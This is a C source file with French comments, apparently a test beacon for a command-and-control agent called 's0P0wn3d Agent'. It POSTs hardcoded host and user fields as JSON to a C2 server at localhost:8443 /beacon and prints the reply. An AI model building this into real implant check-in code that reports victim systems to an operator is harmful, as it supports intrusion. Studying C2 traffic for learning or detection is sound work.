#include <windows.h>
#include <wininet.h>
#include <stdio.h>

// Configuration
#define C2_SERVER "127.0.0.1"  // Localhost pour tester
#define C2_PORT 8443

int main() {
    printf("[*] s0P0wn3d Agent - Test beacon\n");
    printf("[*] C2 Server: %s:%d\n\n", C2_SERVER, C2_PORT);
    
    // Étape 1 : Initialiser WinINet
    printf("[1] InternetOpen...\n");
    HINTERNET hInternet = InternetOpenA(
        "MyAgent/1.0",              // User-Agent
        INTERNET_OPEN_TYPE_DIRECT,  // Connexion directe (pas de proxy)
        NULL, NULL, 0               // Pas de proxy manuel
    );
    
    if (!hInternet) {
        printf("[-] Erreur InternetOpen: %d\n", GetLastError());
        return 1;
    }
    printf("[+] InternetOpen OK\n");
    
    // Étape 2 : Se connecter au serveur
    printf("[2] InternetConnect...\n");
    HINTERNET hConnect = InternetConnectA(
        hInternet,              // Handle de l'étape 1
        C2_SERVER,              // IP du serveur
        C2_PORT,                // Port
        NULL, NULL,             // Pas d'authentification
        INTERNET_SERVICE_HTTP,  // Service HTTP
        0, 0                    // Flags par défaut
    );
    
    if (!hConnect) {
        printf("[-] Erreur InternetConnect: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }
    printf("[+] InternetConnect OK\n");
    
    // Étape 3 : Préparer la requête POST
    printf("[3] HttpOpenRequest...\n");
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,               // Handle de l'étape 2
        "POST",                 // Méthode HTTP
        "/beacon",              // URL path
        NULL, NULL, NULL,       // HTTP version, referer, accept
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,  // Flags
        0                       // Context
    );
    
    if (!hRequest) {
        printf("[-] Erreur HttpOpenRequest: %d\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    printf("[+] HttpOpenRequest OK\n");
    
    // Étape 4 : Envoyer la requête avec les données JSON
    printf("[4] HttpSendRequest...\n");
    
    // Données JSON à envoyer
    char json_data[] = "{\"agent_id\":\"TEST_C\",\"hostname\":\"MY-PC\",\"username\":\"User\",\"os\":\"Windows 10\"}";
    
    // Headers HTTP
    char headers[] = "Content-Type: application/json\r\n";
    
    BOOL sent = HttpSendRequestA(
        hRequest,               // Handle de l'étape 3
        headers,                // Headers HTTP
        strlen(headers),        // Longueur des headers
        json_data,              // Corps de la requête (JSON)
        strlen(json_data)       // Longueur du JSON
    );
    
    if (!sent) {
        printf("[-] Erreur HttpSendRequest: %d\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }
    printf("[+] HttpSendRequest OK\n");
    
    // Étape 5 : Lire la réponse
    printf("[5] InternetReadFile...\n");
    
    char response[4096];
    DWORD bytes_read = 0;
    
    BOOL read = InternetReadFile(
        hRequest,               // Handle de l'étape 3
        response,               // Buffer pour stocker la réponse
        sizeof(response) - 1,   // Taille max à lire
        &bytes_read             // Nombre de bytes réellement lus
    );
    
    if (!read) {
        printf("[-] Erreur InternetReadFile: %d\n", GetLastError());
    } else {
        response[bytes_read] = '\0';  // Terminer la string
        printf("[+] InternetReadFile OK\n");
        printf("\n[*] Réponse du serveur (%d bytes):\n", bytes_read);
        printf("%s\n", response);
    }
    
    // Nettoyer (fermer les handles)
    printf("\n[*] Nettoyage...\n");
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    printf("[+] Terminé !\n");
    return 0;
}